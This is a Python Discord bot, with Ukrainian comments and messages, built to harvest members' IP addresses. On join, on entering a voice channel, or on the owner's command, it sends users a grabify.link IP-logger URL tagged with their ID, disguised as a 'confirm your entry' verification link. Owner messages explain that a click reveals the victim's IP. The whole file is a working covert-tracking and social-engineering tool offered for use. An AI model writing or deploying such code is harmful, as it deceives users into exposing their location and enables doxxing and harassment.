import discord
from discord.ext import commands
import os
import datetime

# ========================================
# 1. НАЛАШТУВАННЯ
# ========================================
TOKEN = os.getenv('DISCORD_TOKEN')
YOUR_USER_ID = int(os.getenv('YOUR_USER_ID', '0'))

# ТВОЄ ПОСИЛАННЯ З GRABIFY
GRABIFY_LINK = "https://grabify.link/AC6BBB"

# ID КАНАЛУ ДЛЯ ПУБЛІКАЦІЇ
LOG_CHANNEL_ID = 123456789012345678  # ← ВСТАВ СВІЙ ID КАНАЛУ

# ========================================
# 2. БОТ
# ========================================
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)

# Словник для відстеження хто отримав посилання
user_links = {}

@bot.event
async def on_ready():
    print(f'✅ Бот {bot.user} запущено!')
    print(f'📊 Підключено до {len(bot.guilds)} серверів')
    print(f'🔗 Grabify посилання: {GRABIFY_LINK}')

@bot.event
async def on_member_join(member):
    """Коли новий учасник заходить на сервер"""
    try:
        user_id = str(member.id)
        tracking_link = f"{GRABIFY_LINK}?id={user_id}"
        user_links[user_id] = tracking_link
        
        # Надсилаємо в ЛС новому учаснику
        embed = discord.Embed(
            title="🎉 Ласкаво просимо!",
            description=f"Привіт, {member.mention}! Для доступу до сервера, підтверди вхід.",
            color=discord.Color.blue()
        )
        embed.add_field(
            name="🔗 Підтвердити вхід",
            value=f"[Натисни тут]({tracking_link})",
            inline=False
        )
        
        await member.send(embed=embed)
        print(f"📨 Відправлено посилання для {member.name}")
        
        # Сповіщаємо власника
        user = await bot.fetch_user(YOUR_USER_ID)
        await user.send(f"👤 **{member.name}** отримав посилання в ЛС")
        
    except Exception as e:
        print(f"❌ Помилка: {e}")

@bot.event
async def on_voice_state_update(member, before, after):
    """Коли хтось заходить у голосовий канал"""
    if before.channel is None and after.channel is not None:
        user_id = str(member.id)
        tracking_link = f"{GRABIFY_LINK}?id={user_id}"
        user_links[user_id] = tracking_link
        
        try:
            user = await bot.fetch_user(YOUR_USER_ID)
            
            embed = discord.Embed(
                title="🔊 НОВИЙ УЧАСНИК У ГОЛОСОВОМУ КАНАЛІ!",
                description=f"**{member.name}** приєднався до каналу **{after.channel.name}**",
                color=discord.Color.gold(),
                timestamp=datetime.datetime.now()
            )
            embed.set_thumbnail(url=member.display_avatar.url)
            embed.add_field(name="👤 Ім'я", value=member.name, inline=True)
            embed.add_field(name="🔊 Канал", value=after.channel.name, inline=True)
            embed.add_field(
                name="🔗 Посилання", 
                value=f"```\n{tracking_link}\n```",
                inline=False
            )
            embed.add_field(
                name="📌 Що робити", 
                value=(
                    "1️⃣ Скопіюй посилання\n"
                    "2️⃣ Відправ його користувачу\n"
                    "3️⃣ Він натискає → ти бачиш IP на grabify.link!"
                ),
                inline=False
            )
            
            await user.send(embed=embed)
            print(f"📨 Відправлено сповіщення про {member.name}")
            
        except Exception as e:
            print(f"❌ Помилка: {e}")

@bot.command(name='link')
async def show_link(ctx):
    """Показати Grabify посилання (тільки власник)"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Тільки для власника!")
        return
    
    embed = discord.Embed(
        title="📊 Grabify посилання",
        description="Переходь за ним, щоб побачити зібрані IP!",
        color=discord.Color.green()
    )
    embed.add_field(name="🔗 Посилання", value=f"```\n{GRABIFY_LINK}\n```", inline=False)
    embed.add_field(name="👥 Відстежується", value=f"{len(user_links)} користувачів", inline=False)
    await ctx.send(embed=embed)

@bot.command(name='stats')
async def show_stats(ctx):
    """Статистика (тільки власник)"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Тільки для власника!")
        return
    
    embed = discord.Embed(
        title="📊 Статистика",
        color=discord.Color.blue()
    )
    embed.add_field(name="👥 Отримали посилання", value=len(user_links), inline=True)
    await ctx.send(embed=embed)

@bot.command(name='send_link')
async def send_link(ctx, user: discord.Member = None):
    """Надіслати посилання конкретному користувачу (тільки власник)"""
    if ctx.author.id != YOUR_USER_ID:
        await ctx.send("⛔ Тільки для власника!")
        return
    
    if user is None:
        await ctx.send("❌ Вкажи користувача: `!send_link @user`")
        return
    
    try:
        user_id = str(user.id)
        tracking_link = f"{GRABIFY_LINK}?id={user_id}"
        user_links[user_id] = tracking_link
        
        embed = discord.Embed(
            title="🔔 Підтвердження входу",
            description=f"{user.mention}, будь ласка, підтверди вхід на сервер.",
            color=discord.Color.blue()
        )
        embed.add_field(name="🔗 Посилання", value=f"[Натисни тут]({tracking_link})", inline=False)
        
        await user.send(embed=embed)
        await ctx.send(f"✅ Посилання відправлено {user.name} в ЛС!")
        
    except Exception as e:
        await ctx.send(f"❌ Помилка: {e}")

# ========================================
# 3. ЗАПУСК
# ========================================
if __name__ == "__main__":
    if not TOKEN:
        print("❌ ПОМИЛКА: DISCORD_TOKEN не знайдено!")
        exit(1)
    
    bot.run(TOKEN)
